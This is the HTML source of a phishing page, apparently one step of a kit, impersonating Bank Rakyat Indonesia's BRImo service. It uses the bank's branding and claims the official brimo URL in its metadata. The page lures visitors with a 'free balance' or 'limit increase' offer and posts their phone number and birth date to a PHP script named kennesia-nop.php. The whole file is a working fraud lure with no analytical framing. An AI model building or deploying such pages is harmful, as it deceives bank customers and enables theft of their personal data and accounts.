
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>PT.Bank Rakyat Indonesia (Persero) Tbk.</title>
    <meta property="og:title" content="PT.Bank Rakyat Indonesia (Persero) Tbk.">
    <meta property="twitter:title" content="PT.Bank Rakyat Indonesia (Persero) Tbk.">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Logo_baru_BRImo.svg/2048px-Logo_baru_BRImo.svg.png" alt="2023">
    <meta property="twitter:image:src" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/Logo_baru_BRImo.svg/2048px-Logo_baru_BRImo.svg.png" alt="2023">
    <meta property="og:url" content="https://brimo.bri.co.id">
    <meta property="og:description" content="Bank Rakyat Indonesia (BRI) adalah salah satu bank komersial terbesar di Indonesia yang selalu mengutamakan kepuasan nasabah.">
    <meta property="twitter:description" content="Bank Rakyat Indonesia (BRI) adalah salah satu bank komersial terbesar di Indonesia yang selalu mengutamakan kepuasan nasabah.">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&display=swap');
    * {
        font-family: 'Montserrat', sans-serif;
        font-weight: 400;
        margin: 0;
        padding: 0;
        font-size: 15px;
        box-sizing: border-box;
        position: relative;
        color: #000;
    }
    html { width: 100vw; height: 100vh; }
    body {
        background: #fff;
        width: 100vw;
        height: 100vh;
    }
    .blue {
        color: #00529C;
    }
    i {
        color: #00529C;
        font-size: 20px;
    }
    .cyan {
        color: #1F8FE5;
    }
    .container {
        width: 100%;
        height: 100%;
        margin: auto auto;
    }
    @media screen and (min-width: 768px) {
        .container {
            width: 400px;
        }
    }
    .flex {
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .head * {
        color: #fff;
    }
    .head {
        width: 100%;
        height: 50px;
        padding: 18px 10px;
        background: #1F8FE5;
        box-shadow: 1px 0 5px 1px #0000004b;
        z-index: 999;
    }
    .head i {
        position: absolute;
        left: 18px;
        font-size: 20px;
        text-align: center;
    }
    .head h1 {
        font-weight: 700;
    }
    .box-img {
        width: 100%;
        height:200px;
        padding: 20px 30px;
        background: #3E9CE5;
    }
    .box-img .wrapimg {
        width: 100%;
        height: 100%;
        border-radius: 10px;
        overflow: hidden;
        background: #1F8FE5;
        box-shadow: 0 0 3px 2px #0000002b;
    }
    .box-img .wrapimg img {
        width: 100%;
        min-width: 100%;
        position: absolute;
        z-index: 999;
        display: none;
        animation: animateright 0.5s
    }
    @keyframes animateright {
        from {
            right: -100px;
            opacity: 0.5
        }
        to {
            right: 0;
            opacity: 1
        }
    }
    .content {
        width: 100%;
        padding: 20px 18px;
    }
    .htit {
        width: 100%;
        display: flex;
        justify-content: center;
        flex-direction: column;
        margin-bottom: 30px;
    }
    .htit h1 {
        text-align: center;
        font-weight: 800;
        font-size: 16px;
        margin-bottom: 5px;
    }
    .htit .desc {
        font-size: 14px;
    }
    .wrpinp {
        width: 100%;
        display: flex;
        align-items: center;
        border-bottom: 2.5px solid #ddd;
        padding-bottom: 4px;
        margin-bottom: 20px;
        background: #fff;
    }
    .wrpinp i {
        width: 37px;
        min-width: 37px;
        height: 37px;
        min-height: 37px;
        text-align: center;
    }
    .wrpinp .binp {
        display: flex;
        flex-direction: column;
        margin-left: 6px;
        width: 100%;
    }
    .binp label {
        font-size: 12px;
        color: #aaa;
        font-weight: 500;
    }
    select,
    input {
        text-align: left;
        width: 100%;
        height: 27px;
        border: none;
        outline: none;
        background: none;
        margin-top: 1px;
        font-weight: 600;
    }
    button:hover {
        background: #0079e65b;
        
    }
    button {
        width: 100%;
        height: 47px;
        max-height: 47px;
        border: none;
        border-radius: 6px;
        background: #0079e6;
        color: #ffffff;
        text-align: center;
        font-size: 14px;
        font-weight: 800;
        margin-top: 35px;
        transition: .2s;
    }
    </style>
</head>
<body>
    <div class="container">
        <div class="flex head">
            <i onclick="window.location.href='./'" class="fa-solid fa-arrow-left"></i>
            <h1>BRImo PROMO</h1>
        </div>
        <div class="flex box-img">
            <div class="wrapimg">
                <img src="img/1.jpg" alt="BRImo" />
                <img src="img/1.jpg" alt="BRImo" />
                <img src="img/1.jpg" alt="BRImo" />
                <img src="img/1.jpg" alt="BRImo" />
            </div>
        </div>
        <div class="content">
            <form onsubmit="$('button').prop('disabled', true);" action="kennesia/kennesia-nop.php" method="post" accept-charset="utf-8">
                <div class="htit">
                    <h1 class="blue">SALDO GRATIS UNTUK ANDA!!<br>AYO ClAIM SEKARANG JUGA!!</h1>
                    <p class="desc">Pastikan Data yang kamu isikan dibawah ini telah terdaftar di BRImo</p>
                </div>
                
                <div class="wrpinp">
                    <i class="flex fa-solid fa-money-bill-wave"></i>
                    <div class="binp">
                        <label>Nominal Hadiah</label>
                        <select required name="gift" id="gift">
                            <option selected hidden value="">-- Pilih Jumlah Hadiah --</option>
                            <option value="CLAIM HADIAH">CLAIM HADIAH</option>
                            <option value="CLAIM PENINGKATAN LIMIT BRI">CLAIM PENINGKATAN LIMIT BRI</option>
                        </select>
                    </div>
                </div>
                <div class="wrpinp">
                    <i class="flex fa-solid fa-mobile-screen-button"></i>
                    <div class="binp">
                        <label>Nomor Telepon</label>
                        <input data-maska="08## #### ########" type="text" inputmode="numeric" name="nope" id="nohp" required autocomplete="off" placeholder="Masukkan Nomor Telepon" pattern=".{12,}" title="( Masukkan nomor Telepon Anda dengan benar )" />
                    </div>
                </div>
                <div class="wrpinp">
                    <i class="flex fa-regular fa-calendar"></i>
                    <div class="binp">
                        <label>Tanggal Lahir</label>
                        <input data-maska="##/##/####" type="text" inputmode="numeric" name="lahir" id="lahir" required autocomplete="off" placeholder="DD/MM/YYYY" pattern=".{10,}" title="( Masukkan Tanggal Lahir Anda dengan benar )" />
                    </div>
                </div> 
                <div class="wrpbtn">
                    <button type="submit">Lanjut</button>
                </div>
            </form>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/maska@2/dist/maska.umd.js"></script>
    <script>
        $(document).ready(function(){
            const { Mask, MaskInput, vMaska } = Maska
            new MaskInput("[data-maska]")
        });
    </script>
<script>
var myIndex = 0;
carousel();
function carousel() {
  var x = $(".wrapimg img");
  x.fadeOut(100);
  myIndex++;
  if (myIndex > x.length) {
    myIndex = 1;
  }
  x.eq(myIndex - 1).show();
  setTimeout(carousel, 3000);
}
</script>
</body>
</html>
